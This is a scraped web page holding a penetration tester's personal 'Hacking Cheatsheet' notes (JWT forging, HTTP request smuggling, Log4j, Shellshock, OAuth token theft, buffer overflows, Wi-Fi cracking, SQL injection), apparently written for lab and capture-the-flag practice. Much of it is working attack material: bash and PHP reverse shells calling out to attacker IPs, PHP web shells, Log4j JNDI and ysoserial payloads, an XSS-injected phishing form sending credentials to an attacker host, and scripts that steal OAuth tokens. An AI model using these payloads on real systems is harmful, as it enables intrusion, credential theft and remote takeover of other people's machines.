= document.getElementById('box'); box.appendChild(image); Phish em xss with \u003cform action=\"http://192.168.49.105/asd\" method=\"GET\"\u003e \u003ch1 class=\"h3 mb-3 fw-normal\"\u003ePlease sign in\u003c/h1\u003e \u003cdiv class=\"form-floating text-dark\"\u003e \u003cinput type=\"text\" class=\"form-control\" id=\"floatingInput\" placeholder=\"name@example.com\" name=\"username\"\u003e \u003clabel for=\"floatingInput\"\u003eUsername\u003c/label\u003e \u003c/div\u003e \u003cdiv class=\"form-floating text-dark\"\u003e \u003cinput type=\"password\" class=\"form-control\" id=\"floatingPassword\" placeholder=\"Password\" name=\"password\"\u003e \u003clabel for=\"floatingPassword\"\u003ePassword\u003c/label\u003e \u003c/div\u003e \u003cbutton class=\"w-100 btn btn-lg btn-primary\" type=\"submit\"\u003eSign in\u003c/button\u003e \u003c/form\u003e JWT Hacktricks Netsparker JWT attacks\nHEADER, PAYLOAD, SIGNATURE Decode from base64 Try setting ALG to “none” should be small letters and then urlencode == then remove signature but leave the last . If you have the public key and the token is using RS256 \u003e change to HS256 Script in /etc If there’s a Key ID or KID in the Header part - test for SQLi or Directory Traversal. \"kid\":\"../../../../dev/null\" this will sign the token with dev/null which is empty Sometimes the output is not in quotes try to add quotes ex output: {\"user\":admin} make it {\"user\":\"admin\"} before encoding to base64 Edit: looks like this only applies in scripting, if done in jwt.io do not add quotes. still need to confirm try to replace kid value with command execution see Hacktricks link From pentesterlab {\"typ\": \"JWT\", \"alg\": \"HS256\", \"kid\": \"|\"} CVE-2017-17405 impacting Ruby Net::FTP bruteforce jwt secret using john john jwt.token --wordlist=wordlist.txt --format=HMAC-SHA256 SQLi in jwt see Hacktricks link. ' UNION SELECT 'ATTACKER';-- - then set the secret to ATTACKER Sometimes they don’t even verify the signature, so just try changing the user to admin. jku header devs can use public key from URLs inside using the jku header, attackers can host their self signed jwk file. Ippsec UniCode video Using Burp INSTALL JWT editor in burp and try the following\nalg to none\nBruteforce Signing key\nbruteforce weak key hashcat -a 0 -m 16500 /path/to/jwt.secrets.list generate new symmetric key use the bruteforced secret replace k value in key with base64 encoded secret Insert jwk\ngenerate an RSA key embed jwk Inject jku\ngenerate an rsa key copy as public jwk host edit the header add \"jku\":\"host location\" edit the kid of the jwt to the same one within the public jwk sign the jwt done CORS Misconfiguration Check for Access-Control-Allow-Origin: and Access-Control-Allow-Credentials: in response. Add Origin header in request - try Null More payloads PayloadAlltheThings add Origin: header if it gets reflected in the response Access-Control-Allow-Origin: try offsecscript/cors/cors.html Samesite Some browsers will block a cookie with SameSite=None if the Secure flag is not also set.\nLax - not to send the cookie on cross-site requests. However, the browser will send the cookie during navigation when a user manually enters the URL in the browser or clicks a link to the site\nStrict - will only send cookie if the request is same domain with cookie\n\u003ciframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"\"\u003e\u003c/iframe\u003e Git Information Leak Check for .git directory wget -r then git diff git diff HEAD~1 or 2 and so on to show previous commit changes .git might not be accessible but /.git/HEAD or config might be. nice to check. git log Don’t forget to git init first 2 characters is directory c3646db7f9c7e6f126c75900fdcce16d50e1da82 = /.git/objects/c3/646db7f9c7e6f126c75900fdcce16d50e1da82 git cat-file -p c3646db7f9c7e6f126c75900fdcce16d50e1da82 HTTP Request Smuggling portswigger video Albinowax’ research\nDetecting\nIssue an ambiguous request followed by a normal ‘victim’ request, then observe whether the latter gets an unexpected response. prone to false negatives If CL.TE the following will cause an observable delay. If server is in sync this will get rejected OR harmlessly processed If TE.CL the front end will reject the message without ever forwarding to the backend because of invalid chunk size ‘Q’\nPOST /about HTTP/1.1 Host: example.com Transfer-Encoding: chunked Content-Length: 4 1 Z Q If TE.CL\nPOST /about HTTP/1.1 Host: example.com Transfer-Encoding: chunked Content-Length: 6 0 X ALWAYS test for CL.TE first if we do TE.CL and the server is CL.TE this will poison the backend and potentially harming legitimate users. Disable in Burp \u003e Repeater \u003e Update Content-Length Exploiting If CL.TE\nPOST /about HTTP/1.1 Host: example.com Transfer-Encoding: chunked Content-Length: 6 0 X to exploit replace X with : GET /404 HTTP/1.1 X` IF TE.CL\nPOST / HTTP/1.1 Host: your-lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 FTP FTP SSL? openssl s_client -connect : -starttls ftp lftp lftp set ftp:ssl-force true set ssl:verify-certificate no connect username NFS showmount -e ip mount 10.10.10.10:/share Serializations PHP [SnoopySec] (https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html)\nLook for unserialize() Adding Tilde(~) when requesting PHP might show the source code look for _destruct() or _wakeup() Owasp Java serialized object often is encoded with these as the beginning characters ac ed for hex or rO0 for base64 look for readObject() method used to read and deserialize data from an InputStream Log4j java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"https://c6c9-202-89-151-235.ngrok.io:8888/log4jrce\" ${jndi:ldap://10.10.14.2:1337/a} ysoserial-modified java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i \u003e\u0026 /dev/tcp/10.10.14.6/9002 0\u003e\u00261' \u003e ~/htb/logforge/ysoserial.ser Creates a serialized payload JNDI-exploit-kit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.6:1389 -P ~/htb/logforge/ysoserial.ser Listens to port 1389 then sends ysoserial.ser after running ysoserial-modified we will get links for different versions for jdk to try out. ${jndi:ldap://10.10.14.6:1389/vojbuj} ${jndi:ldap://10.10.14.2:1337/${sys:java.class.path} or ${java:version} or ${java:os}} or can be replaced with …. to do nested thingy Using JRMPListener to send CommonsCollections java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsCollections5 \"**_CMD_**\" **_this will set up a listener listening on port 1337. send your payload ${jndi:rmi://10.10.10.10:1337/a} and should receive something. public class Log4jRCE { static { try { String [] cmd={\"touch\", \"/tmp/TEST\"}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); }catch (Exception e){ e.printStackTrace(); } } } Apache Apache on 80 Tomcat on 8080 encoding of .. = %252e%252e Tomcat Hacktricks\naccess manager bypass /whatever/..;/manager/html msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.14.2 LPORT=9001 -f war -o hyst.war /manager/html/expire?path=/ 0xdf used this to test for log4j using Post and jndi payload as body One-Liners \u003c?php system($_REQUESTS['hyst']); ?\u003e \u003c?php system($_GET[\"cmd\"]);?\u003e \u003c?php print exec('command'); ?\u003e \u003c?php echo file_get_contents('/home/carlos/secret'); ?\u003e ShellShock To detect nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh () { :;}; echo; **_CMD_** CMD SHOULD BE ABSOLUTE PATH /usr/bin/whoami Echo is used to add a blank space between headers and body output Try in User-Agent or Cookie curl -H 'User-Agent: () { :; }; echo; /bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.14.2/9001 0\u003e\u00261\"' http://10.10.10.56/cgi-bin/user.sh C app / binaries Use gdb / strace crash the app then have a look at /var/crashes use apport-unpack Node Ippsec gdb ./binary layout asm create a breakpoint break *(main+103) run jump to what ever jump *(main+109) GPG/PGP/ASC gpg2john test.asc \u003e hash john --format=gpg hash --wordlist=rockyou.txt gpg --import gpg -d CBC-MAC IV is set as a cookie in response after logging in GraphiQL Look for /graphql enpoints - might show web based IDE - or convert the following to proper json and use burp - replace newline with \\n? and then insert it to query part of the post body. query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } locations } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } onOperation onFragment onField } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } query MyQuery { __schema { types { name fields { name } } } } query Query { ptlabkeys { value } } Source Code Reviews GoldMine\nPHP Directory Traversal public static function list_files_for_user($username) { $base = \"files/\".$username; ### Vulnerability as user controlled input is getting concatenated. user input can be `../../../etc/passwd?` if (!file_exists($base)) { mkdir($base); } return array_diff(scandir($base), array('..', '.')); } File Upload Bypass public static function addfile($user) { $file = \"files/\".basename($user).\"/\".basename($_FILES[\"file\"][\"name\"]); if (!preg_match(\"/\\.pdf/\", $file)) { #Does not stop the user from uploading shell.pdf.php need to add $ to properly regex. return \"Only PDF are allowed\"; } elseif (!move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $file)) { return \"Sorry, there was an error uploading your file.\"; } return NULL; } ASP.NET Views = contains html pages .cshtml extension = c#html, gets list of data from controller Model = data related = classes, sql statements, gives controller with list of objects Google Dorks site: include only results on a given hostname. intitle: filtest according to the title of a page. inurl: filters according to url of a resource. filetype: filters according to file extensions. - filters out keywords Buffer Overflow BOF Main goal is to overflow buffer space to overwrite EIP(Extended Instruction Pointer) Steps in BOF\nSpiking: Finding vulnerable part of the program Fuzzing: Sending characters to the vulnerable part of the program to break it Finding Offset: This is where the program crashes Overwrite the EIP using the Offset found Find the right module Shellcode Tools\nImmunity Debugger generic_send_tcp Spiking readelf -s program s_readline(); s_string(\"TRUN \"); s_string_variable(\"0\"); Metasploit module for pattern pattern_create.rb -l \"bytes\" pattern_offset -l \"bytes\" -q \"what data is in EIP HEX\" Bad Character Checker\nFinding Modules Finding Modules - Mona nasm_shell.rb msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT EXITFUNC=thread -f c -a x86 -b \"badcharacters\" Shell example shellcode= \"A\" * 2002 + \"\\xaf\\x11\\x50\\x62 - this address is from nasm_shell.rb JMP ESP\" + \"\\x90\" * 32 + overflowfrommsfvenom OAuth Cheatsheet\nIn OAuth 2.0, the client requests access to resources controlled by the resource owner and hosted by the resource server and is issued a different set of credentials than those of the resource owner. Instead of using the resource owner’s credentials to access protected resources, the client obtains an access token.\nResource Owner = ME Resource Server = API I want to access Client = Web server that wants to access the API Auth server = OID server. OAuth 2.0 Oauth that uses implicit grant, this one does not request for a code but goes directly to ask for a token. Hijack account using redirect_uri Intercept the request that asks for a code change the redirect_uri to your server. send payload to victim. If the victim loads the payload your server will get a valid code to continue the flow and get a valid token of the victim EX. payload\n\u003ciframe src=\"https://oauth-ac361fb21ebd0c90c081232a02a0000f.web-security-academy.net/auth?client_id=onpkl0n5tyylthtolkxnr\u0026redirect_uri=https://exploit-ac961f381edb0cdcc03b232201d80044.web-security-academy.net/exploit\u0026response_type=code\u0026scope=openid%20profile%20email\"\u003e\u003c/iframe\u003e Steal token via open redirect example from portswigger. \u003cscript\u003e if (!document.location.hash) { window.location = 'https://oauth-ac5c1fa71f183ad6c01d63bf029c0093.web-security-academy.net/auth?client_id=nl739ogh6wfprguffv3pu\u0026redirect_uri=https://ac5f1fde1fef3aeec00463d7000f0082.web-security-academy.net/oauth-callback/../../../../post/next?path=https://exploit-ac5f1ff41fce3a1ec0366355011f0094.web-security-academy.net/exploit\u0026response_type=token\u0026nonce=-233235662\u0026scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } \u003c/script\u003e Steal token via comments example from portswigger. \u003ciframe src=\"https://oauth-ac5b1f091ebc87a7c0231e43020600b9.web-security-academy.net/auth?client_id=flf29axxxdwj96jjj8qi0\u0026redirect_uri=https://ac441fd31e7c8793c0611e60007e0029.web-security-academy.net/oauth-callback/../post/comment/comment-form\u0026response_type=token\u0026nonce=-1552239120\u0026scope=openid%20profile%20email\"\u003e\u003c/iframe\u003e \u003cscript\u003e window.addEventListener('message', function(e) { fetch(\"/\" + encodeURIComponent(e.data.data)) }, false) \u003c/script\u003e Business Logic Try setting values to negative then add positive value = free stuff? Try reaching max int value 2,147,483,647 Check registrations for example email characters limited to 255 PortSwigger Lab does change email function send confirmation email delete parameters? example in forgot password function delete current password? coupon codes? tried sending same code via repeater. alternate two codes. Better PTY? stty raw -echo always fails for me instead use rlwrap -car nc -lvnp 9001 then use the usual python3 -c 'import pty;pty.spawn(\"/bin/bash\");' Now you have clear autocomplete and everything! Privesc Stuff Linux linux exploit suggester.sh Sudo rights on a file? Do you own the file? edit. hijack variable Path variable Vulnerability Symlink? Has write permission to something linked to another file? change symlink with ln -fns /tmp/newlink /var/www/html/itemtolink DNS Port 53 Open\nNslookup SERVER Search for 127.0.0.1 and Zone Transfer dig axfr@ PHPINFO() Insomnia #1 \u003c3\nCheck for file_uploads = on in phpinfo \u003e meaning any php request will accept uploaded files MongoDB likes everything in json mongo -u -p db.tasks.insert({\"cmd\":\"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom\"}); Thick Client Testing Nmap box before installing target app then nmap again after install Microsoft Attack Surface Analyzer run before installing the target app then run again after Sysinternals DLL Hijacking Hijacklib fast as ffff scan sudo masscan 192.168.141.90 -p0-65535 --rate 1000 -e tun0 masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0 //might miss something sudo nmap --min-rate 4500 --max-rtt-timeout 1500ms 192.168.141.90 -p- Wifi Pentesting sudo airmon-ng shows our device’s driver. kali@kali:~$ sudo airmon-ng PHY Interface Driver Chipset phy0 wlan0 ath9k_htc Qualcomm Atheros Communications AR9271 802.11n iw new command\nsudo iw dev wlan0 scan | egrep \"DS Parameter set|SSID: get the channel\nsudo iw dev wlan0 interface add wlan0mon type monitor use wlan0 to setup wlan0mon in monitor mode\nsudo ip link set wlan0mon up bring wlan0mon up\nsudo iw dev wlan0mon info show wlan0mon info\nsudo iw dev wlan0mon interface del remove\nUse the following script so wireshark can scan all channels. Wireshark doesnt channel hop. or you can just use Airodump-ng :P\nfor channel in 1 6 11 2 7 10 3 8 4 9 5 do iw dev wlan0mon set channel ${channel} sleep 1 done sudo airmon-ng check checks for processes that might interfere with aircrack suite, adding kill will gracefully kill the processes identified. Airmon-ng Used to setup monitor mode\nsudo airmon-ng start will result to wlan0mon sudo iw dev wlan0mon info sudo airmon-ng stop wlan0mon Airodump-ng Used to capture raw 802.11 frames, suitable for collecting WEB IVs or WPA/WPA2 handshakes which will be used with Aircrack-ng\n-w prefix Saves the capture dump to the specified filename --bssid BSSID Filters Airodump-ng to only capture the specified BSSID -c channel(s) Forces Airodump-ng to only capture the specified channel(s) Sniffing with Airodump-ng\nsudo airodump-ng wlan0mon -c 2 The top portion provides information about detected APs along with the encryption in use, network names, etc. The lower portion provides information about stations sending frames and the associated AP. See Aircrack website for more info.\nsudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon -w outputs the file as cap1 Aireplay-ng Generate wireless traffic. Used with Aircrack-ng to crack WEP keys\nBasic Injection Test\nMake sure you are in the same CH as the AP sudo airmon-ng start wlan0 sudo aireplay-ng -9 wlan0mon sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon Injection test specific SSID -e SSID/ESSID -a BSSID Aircrack-ng Nice Tut\nPut wlan0 to monitor mode sudo airodump-ng wlan0mon dump all wireless List down details of our target BSSID(Mac address of AP), Station(Client connected Mac address), AUTH(PSK) aircrack-ng does not work with Enterprise(MGT), Opportunistic Wireless Encryption(OWE) cannot be cracked yet. use airodump again against the specific AP target sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon this will save the result to wpa.cap Aireplay to deauth the client and capture 4-way Handshake sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon The -0 1 means Deauth once. Once client reconnects we will be able to capture a handshake let airodump run for a bit. Use aircrack to Crack the handshake aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap confirm passphrase airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap Failed to get a handshake?\nTry sending deauth as broadcast. omit -c 802.11w can’t do anything but to wait for a client to connect. Custom Wordlist for Aircrack\njtr crunch mangler Cracking with Hashcat\nconvert pcap to hccapx /usr/lib/hashcat-utils/cap2hccapx.bin \u003c.pcap\u003e output.hccapx hashcat -m 2500 output.hccapx Airolib-ng Used to compute Pairwise Master Keys(PMK)\necho wifu \u003e essid.txt airolib-ng wifu.sqlite --import essid essid.txt airolib-ng wifu.sqlite --stat airolib-ng wifu.sqlite --import passwd airolib-ng wifu.sqlite --batch aircrack-ng -r wifu.sqlite CoWPAtty Used for rainbow table attacks to crack WPA passphrases\ngenpmk -f -d outfile -s wifu kinda like airolib cowpatty -r -d -s wifu SNMP snmp-check snmpwalk -c public -v1 -t 10 auxiliary/scanner/snmp/snmp_enum black hole mode enabled? theres an RCE for SMTP Tools NMAP -sv \u003e Service Version \u003e used for banner grabbing PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.38 scripts \u003e /usr/share/nmap/scripts nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP Safe won’t do anything intrusive like write files on target, bruteforce, do high traffic stuff\nCewl sudo cewl -d 2 -m 5 -w Wordlist.txt example.com\nWfuzz parameter discovery\nburp-parameter-names.txt\nwfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 \"http://offsecwp:80/index.php?FUZZ=data\"\nwfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d \"log=admin\u0026pwd=FUZZ\" http://target:80/wp-login.php\nwfuzz -c -z file,/home/all3n/tools/SecLists/Passwords/rockyou.txt --hw 325 -d \"username=bob\u0026password=FUZZ\" -b 'PHPSESSID=2455efd8379026e261ef78186cebfc42' http://192.168.191.121/dev/index.php\nTry fuzzing for files that ends with xml aswell and anyother types txt,csv,bak etc. Vhost fuzzing\nwfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H \"Host: preprod-FUZZ.host.com\" --hc 200 --hw 356 -t 100 10.10.10.101\nHakrawler Uses The wayback Machine to gather directories.\nShells php -r '$sock=fsockopen(\"10.0.0.1\",80);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$sock=fsockopen(\"10.0.0.1\",80);shell_exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$sock=fsockopen(\"10.0.0.1\",80);system(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$sock=fsockopen(\"10.0.0.1\",80);passthru(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$sock=fsockopen(\"10.0.0.1\",80);popen(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\", \"r\");' ","wordCount":"6484","inLanguage":"en","datePublished":"2021-07-27T00:00:00Z","dateModified":"2021-07-27T00:00:00Z","author":{"@type":"Person","name":"allenxd"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.allenxd.com/notes/"},"publisher":{"@type":"Organization","name":"Hacking Cheatsheet","logo":{"@type":"ImageObject","url":"https://blog.allenxd.com/home/braindump.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.allenxd.com/ accesskey=h title="allenxd (Alt + H)"><img src=https://blog.allenxd.com/home/braindump.png alt aria-label=logo height=35>allenxd</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.allenxd.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://blog.allenxd.com/notes/ title=Notes><span class=active>Notes</span></a></li><li><a href=https://blog.allenxd.com/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://blog.allenxd.com/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.allenxd.com/>Home</a></div><h1 class=post-title>Notes</h1><div class=post-meta><span title='2021-07-27 00:00:00 +0000 UTC'>July 27, 2021</span>&nbsp;·&nbsp;allenxd</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#samba>Samba</a></li><li><a href=#sqli>SQLi</a><ul><li><a href=#union>Union</a></li><li><a href=#sorting>Sorting</a></li><li><a href=#boundary-testing>Boundary Testing</a></li><li><a href=#error-based-payloads>Error Based Payloads</a></li><li><a href=#stacked-queries>Stacked Queries</a></li><li><a href=#boolean>Boolean</a></li><li><a href=#reading-and-writing-files>Reading and Writing Files</a></li><li><a href=#blind-sqli--manual-bruteforce>Blind SQLi / Manual Bruteforce</a></li><li><a href=#querying-version-db-table_name-user>Querying Version, db, Table_name, user()</a></li><li><a href=#uploading-shell-sqli>Uploading Shell SQLi</a></li><li><a href=#sqli-rce>sqli RCE</a></li><li><a href=#sqlmap>SQLMap</a></li></ul></li><li><a href=#nosqli>NoSQLi</a><ul><li><a href=#mongodb>MongoDB</a></li></ul></li><li><a href=#bruteforcing>Bruteforcing</a><ul><li><a href=#basic-auth>Basic Auth</a></li><li><a href=#smb>SMB</a></li><li><a href=#ftp>FTP</a></li></ul></li><li><a href=#tcpdump>TCPdump</a><ul><li><a href=#monitor-your-injections-with-tcpdump>Monitor your injections with tcpdump</a></li></ul></li><li><a href=#pivotingportforwadingtunneling>Pivoting/PortForwading/Tunneling</a><ul><li><a href=#used-msfconsole-mutihandler>Used msfconsole muti/handler</a></li><li><a href=#socat>Socat</a></li><li><a href=#proxychains>ProxyChains</a></li><li><a href=#port-forwarding>Port Forwarding</a></li><li><a href=#reverse-connection>Reverse Connection</a></li><li><a href=#plinkexe-for-windows>Plink.exe for Windows</a></li><li><a href=#reverse-ssh-tunnel>Reverse SSH Tunnel</a></li></ul></li><li><a href=#web-app>Web APP!</a><ul><li><a href=#authentication>Authentication</a></li><li><a href=#authorization>Authorization</a></li><li><a href=#code-injection>Code Injection</a></li><li><a href=#command-injection>Command Injection</a></li><li><a href=#directory-traversal>Directory Traversal</a></li><li><a href=#file-inclusion>File Inclusion</a></li><li><a href=#ldap>LDAP</a></li><li><a href=#open-redirect>Open Redirect</a></li><li><a href=#csrf>CSRF</a></li><li><a href=#ssrf>SSRF</a></li><li><a href=#ssti>SSTI</a></li><li><a href=#file-upload>File Upload</a></li><li><a href=#xxe>XXE</a></li><li><a href=#xss>XSS</a></li><li><a href=#phish-em>Phish em</a></li><li><a href=#jwt>JWT</a></li><li><a href=#cors-misconfiguration>CORS Misconfiguration</a></li><li><a href=#samesite>Samesite</a></li><li><a href=#git-information-leak>Git Information Leak</a></li><li><a href=#http-request-smuggling>HTTP Request Smuggling</a></li></ul></li><li><a href=#ftp-1>FTP</a></li><li><a href=#nfs>NFS</a></li><li><a href=#serializations>Serializations</a><ul><li><a href=#php-1>PHP</a></li><li><a href=#java>Java</a></li></ul></li><li><a href=#log4j>Log4j</a></li><li><a href=#apache>Apache</a><ul><li><a href=#tomcat>Tomcat</a></li></ul></li><li><a href=#one-liners>One-Liners</a></li><li><a href=#shellshock>ShellShock</a></li><li><a href=#c-app--binaries>C app / binaries</a></li><li><a href=#gpgpgpasc>GPG/PGP/ASC</a></li><li><a href=#cbc-mac>CBC-MAC</a></li><li><a href=#graphiql>GraphiQL</a></li><li><a href=#source-code-reviews>Source Code Reviews</a><ul><li><a href=#php-2>PHP</a></li><li><a href=#aspnet>ASP.NET</a></li></ul></li><li><a href=#google-dorks>Google Dorks</a></li><li><a href=#buffer-overflow-bof>Buffer Overflow BOF</a><ul><li><a href=#spiking>Spiking</a></li><li><a href=#metasploit-module-for-pattern>Metasploit module for pattern</a></li><li><a href=#finding-modules>Finding Modules</a></li><li><a href=#shell-example>Shell example</a></li></ul></li><li><a href=#oauth>OAuth</a><ul><li><a href=#oauth-20>OAuth 2.0</a></li></ul></li><li><a href=#business-logic>Business Logic</a></li><li><a href=#better-pty>Better PTY?</a></li><li><a href=#privesc-stuff>Privesc Stuff</a><ul><li><a href=#linux>Linux</a></li></ul></li><li><a href=#dns>DNS</a></li><li><a href=#phpinfo>PHPINFO()</a></li><li><a href=#mongodb-1>MongoDB</a></li><li><a href=#thick-client-testing>Thick Client Testing</a></li><li><a href=#fast-as-ffff-scan>fast as ffff scan</a></li><li><a href=#wifi-pentesting>Wifi Pentesting</a><ul><li><a href=#airmon-ng>Airmon-ng</a></li><li><a href=#airodump-ng>Airodump-ng</a></li><li><a href=#aireplay-ng>Aireplay-ng</a></li><li><a href=#aircrack-ng>Aircrack-ng</a></li><li><a href=#airolib-ng>Airolib-ng</a></li><li><a href=#cowpatty>CoWPAtty</a></li></ul></li><li><a href=#snmp>SNMP</a></li><li><a href=#tools>Tools</a><ul><li><a href=#nmap>NMAP</a></li><li><a href=#cewl>Cewl</a></li><li><a href=#wfuzz>Wfuzz</a></li><li><a href=#hakrawler>Hakrawler</a></li><li><a href=#shells>Shells</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=samba>Samba<a hidden class=anchor aria-hidden=true href=#samba>#</a></h2><p>What to do if samba port is open?</p><ul><li>Check for usernames <code>enum4linux -a 10.10.10.10</code></li><li>Smbclient<ul><li><code>smbclient -L //10.10.10.10</code></li><li><code>smbclient -L //10.10.10.10 -N</code> <strong><em>No password (SMB Null session)</em></strong></li><li><code>smbclient --no-pass -L 10.10.10.10</code></li><li><code>smbclient //10.10.10.10/share_name</code></li><li><code>nmap -script=smb-vuln\* -p445 192.168.103.40</code></li></ul></li><li>Smbmap<ul><li><code>smbmap -H 10.10.10.10</code></li><li><code>smbmap -H 10.10.10.10 -u '' -p ''</code></li><li><code>smbmap -H 10.10.10.10 -s share_name</code></li></ul></li><li>CrackMapExec<ul><li><code>crackmapexec smb 10.10.10.10 -u '' -p '' --shares</code></li><li><code>crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares</code></li><li><code>crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares</code></li><li><code>crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name</code></li></ul></li></ul><h2 id=sqli>SQLi<a hidden class=anchor aria-hidden=true href=#sqli>#</a></h2><p><a href=https://gist.github.com/hofmannsven/9164408>Nice cheatsheet from hofmannsven</a></p><p>When testing remember to try different comments <code>-- -</code> <code>#</code></p><p><code>SELECT name, description FROM products WHERE id=9;</code> <strong><em>&mdash; queries the db for name and desc in product table where id=9</em></strong><br><code>SELECT -column list- FROM -table- WHERE -condition-</code></p><p>Example vulnerable code</p><p><code>$id = $_GET['id'];</code></p><p><code>"SELECT name, desc FROM productes WHERE ID='$id';";</code></p><p><code>'a OR 'a'='a</code></p><p><code>SELECT name, desc FROM products WHERE ID='' OR 'a'='a';</code></p><h3 id=union>Union<a hidden class=anchor aria-hidden=true href=#union>#</a></h3><p><code>SELECT &lt;statement> UNION &lt;other> SELECT statement;</code></p><p><code>SELECT name, description FROM Products WHERE ID='3' UNION SELECT username, password FROM accounts</code></p><p>With group_concat <strong><em>&mdash; use when there&rsquo;s only 1 column? and sql is only showing the first entry</em></strong></p><p><code>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'</code>
